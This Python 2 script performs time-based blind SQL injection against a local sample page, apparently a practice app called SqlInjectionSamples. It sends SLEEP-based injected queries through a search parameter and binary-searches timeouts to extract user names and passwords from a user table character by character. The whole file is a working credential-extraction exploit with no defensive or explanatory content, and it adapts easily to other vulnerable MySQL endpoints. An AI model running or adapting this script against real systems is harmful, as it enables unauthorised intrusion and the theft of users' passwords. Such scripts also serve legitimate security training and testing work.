import requests

target = 'http://localhost:8080/SqlInjectionSamples/Story5.jsp'
attackVector1 = 'IF((ascii(substring((select APP084_USER_NAME from APP084_USER order by APP084_USER_ID limit _tbl-index_,1),_pos_,1)) <= _check_), SLEEP(0.2), 0)%23'
attackVector2 = 'IF((ascii(substring((select APP084_USER_PASSWORD from APP084_USER order by APP084_USER_ID limit _tbl-index_,1),_pos_,1)) <= _check_), SLEEP(0.2), 0)%23'
debug = 1

def httpCall(attackVector, req):
    try:
        req = requests.get(target + "?q=USB\' and " + attackVector.replace("_tbl-index_", str(i)).replace("_pos_", str(pos)).replace("_check_", str(mid)), verify=False, timeout=0.2)
        return False
    except requests.exceptions.Timeout:
        return True

req = requests.get(target)
if req.status_code != requests.codes.ok:
    raise ValueError('Unable to connect to target')

totalQueryCount = 0
for i in range(0, 100):
    try:
        answer = ''
        pos = 1
        mid = 0
        while (True):
            lo = 1
            hi = 255
            temp = -1

            if(debug):
                print "Checking for character " + str(pos)

            while (lo <= hi):
                mid = (lo + hi) / 2
                totalQueryCount = totalQueryCount + 1
                if (httpCall(attackVector1, req)):
                    hi = mid-1
                    temp = mid
                else:
                    lo = mid+1
            if (hi == 0): break
            if(debug):
                print "Got " + chr(temp)
            answer += chr(temp)
            pos += 1

        answer += ' > '
        pos = 1
        mid = 0
        while (True):
            lo = 1
            hi = 255
            temp = -1

            if(debug):
                print "Checking for character " + str(pos)

            while (lo <= hi):
                mid = (lo + hi) / 2
                totalQueryCount = totalQueryCount + 1
                if (httpCall(attackVector2, req)):
                    hi = mid-1
                    temp = mid
                else:
                    lo = mid+1
            if (hi == 0): break
            if(debug):
                print "Got " + chr(temp)
            answer += chr(temp)
            pos += 1

        print answer
    except ValueError:
        break

print "Total query count: " + str(totalQueryCount)